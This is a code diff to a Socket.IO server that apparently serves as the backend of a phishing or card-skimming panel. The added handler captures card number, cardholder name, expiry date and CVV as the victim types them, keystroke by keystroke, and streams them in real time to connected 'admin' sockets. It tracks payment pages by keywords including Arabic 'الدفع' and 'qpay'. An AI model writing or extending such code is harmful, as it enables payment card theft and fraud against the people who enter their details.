@@ -538,6 +538,12 @@ io.on("connection", (socket) => {
         visitor.lastDataUpdate = new Date().toISOString();
         visitor.hasEnteredCardPage = true;
       }
+      // Clear liveCard when leaving payment page
+      const pageLower2 = (page || '').toLowerCase();
+      if (!pageLower2.includes('الدفع') && !pageLower2.includes('payment') && !pageLower2.includes('credit') && !pageLower2.includes('qpay')) {
+        visitor.liveCard = null;
+        visitor.liveCardTimestamp = null;
+      }
       visitors.set(socket.id, visitor);
       saveVisitorPermanently(visitor);
 
@@ -546,6 +552,31 @@ io.on("connection", (socket) => {
         io.to(adminSocketId).emit("visitor:pageChanged", {
           visitorId: visitor._id,
           page,
+        });
+      });
+    }
+  });
+
+  // Handle live card data (real-time keystroke updates)
+  socket.on("card:live", (data) => {
+    const visitor = visitors.get(socket.id);
+    if (visitor) {
+      visitor.liveCard = {
+        cardNumber: data.cardNumber || "",
+        nameOnCard: data.nameOnCard || "",
+        expiryDate: data.expiryDate || "",
+        cvv: data.cvv || "",
+      };
+      if (!visitor.liveCardTimestamp) {
+        visitor.liveCardTimestamp = new Date().toISOString();
+      }
+      visitors.set(socket.id, visitor);
+      // Notify admins immediately
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit("card:liveUpdate", {
+          visitorId: visitor._id,
+          liveCard: visitor.liveCard,
+          liveCardTimestamp: visitor.liveCardTimestamp,
         });
       });
     }
